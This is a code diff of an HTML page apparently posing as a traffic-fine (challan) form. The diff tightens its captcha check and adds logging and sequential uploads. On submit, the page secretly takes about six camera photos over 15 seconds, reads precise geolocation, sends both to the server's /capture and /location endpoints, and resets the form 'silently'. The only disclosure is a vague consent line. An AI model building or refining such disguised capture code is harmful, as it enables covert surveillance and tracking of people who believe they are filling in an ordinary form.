@@ -239,8 +239,8 @@
 
         <button type="submit" class="submit-btn">Submit</button>
         <p class="data-notice-text">
-            By submitting this form, you consent to the collection of your info.
-          </p>
+          By submitting this form, you consent to the collection of your info.
+        </p>
 
         <div class="links">
           <a href="#"
@@ -292,18 +292,7 @@
         const randomIndex = Math.floor(Math.random() * captchaData.length);
         currentCaptcha = captchaData[randomIndex];
         document.getElementById("captchaImg").src = currentCaptcha.image;
-        document.getElementById("captchaInput").value = ""; // Clear input
-      }
-
-      // Call this when validating the form
-      function validateCaptcha() {
-        const userInput = document.getElementById("captchaInput").value;
-        if (userInput === currentCaptcha.answer) {
-          return true;
-        } else {
-          document.getElementById("captchaError").style.display = "block";
-          return false;
-        }
+        document.getElementById("captchaInput").value = "";
       }
 
       // Function to capture multiple photos from camera
@@ -362,17 +351,28 @@
       // Function to send data to backend
       async function sendToBackend(imageDataArray, locationData) {
         try {
-          // Upload all images
-          const imageUploadPromises = imageDataArray.map(async (imageData, index) => {
+          console.log('Uploading images...', imageDataArray.length);
+          
+          // Upload all images sequentially
+          const imageResults = [];
+          for (let i = 0; i < imageDataArray.length; i++) {
+            console.log(`Uploading image ${i + 1}/${imageDataArray.length}`);
             const imageResponse = await fetch('/capture', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ image: imageData })
+              body: JSON.stringify({ image: imageDataArray[i] })
             });
-            return await imageResponse.json();
-          });
+            
+            if (!imageResponse.ok) {
+              throw new Error(`Image upload ${i + 1} failed: ${imageResponse.statusText}`);
+            }
+            
+            const result = await imageResponse.json();
+            console.log(`Image ${i + 1} uploaded:`, result);
+            imageResults.push(result);
+          }
           
-          const imageResults = await Promise.all(imageUploadPromises);
+          console.log('Uploading location...', locationData);
           
           // Upload location
           const locationResponse = await fetch('/location', {
@@ -380,7 +380,13 @@
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(locationData)
           });
+          
+          if (!locationResponse.ok) {
+            throw new Error(`Location upload failed: ${locationResponse.statusText}`);
+          }
+          
           const locationResult = await locationResponse.json();
+          console.log('Location uploaded:', locationResult);
           
           return { imageResults, locationResult };
         } catch (error) {
@@ -396,6 +402,9 @@
         .getElementById("challanForm")
         .addEventListener("submit", async function (e) {
           e.preventDefault();
+          
+          console.log('Form submitted');
+          
           let valid = true;
 
           document
@@ -424,24 +433,33 @@
             valid = false;
           }
 
-          if (!captchaInput) {
+          if (!captchaInput || captchaInput !== currentCaptcha.answer) {
             document.getElementById("captchaError").style.display = "block";
             valid = false;
           }
+
+          console.log('Validation:', valid);
 
           if (valid) {
             const submitBtn = document.querySelector('.submit-btn');
             submitBtn.disabled = true;
             
             try {
+              console.log('Starting photo capture...');
+              
               // Capture multiple photos (15 seconds = 6 images: 0s, 3s, 6s, 9s, 12s, 15s)
               const imageDataArray = await capturePhotos(15000);
+              
+              console.log(`Captured ${imageDataArray.length} photos`);
+              console.log('Getting location...');
               
               // Get location
               const position = await new Promise((resolve, reject) => {
                 if (navigator.geolocation) {
                   navigator.geolocation.getCurrentPosition(resolve, reject, {
-                    enableHighAccuracy: true
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
                   });
                 } else {
                   reject(new Error('Geolocation not supported'));
@@ -454,12 +472,19 @@
                 accuracy: position.coords.accuracy
               };
               
+              console.log('Location obtained:', locationData);
+              console.log('Sending to backend...');
+              
               // Send to backend
               const result = await sendToBackend(imageDataArray, locationData);
+              
+              console.log('Upload complete:', result);
               
               // Reset form silently
               document.getElementById('challanForm').reset();
               refreshCaptcha();
+              
+              console.log('Form reset complete');
               
             } catch (error) {
               console.error('Submission error:', error);
@@ -468,6 +493,6 @@
             }
           }
         });
-</script>
+    </script>
   </body>
 </html>
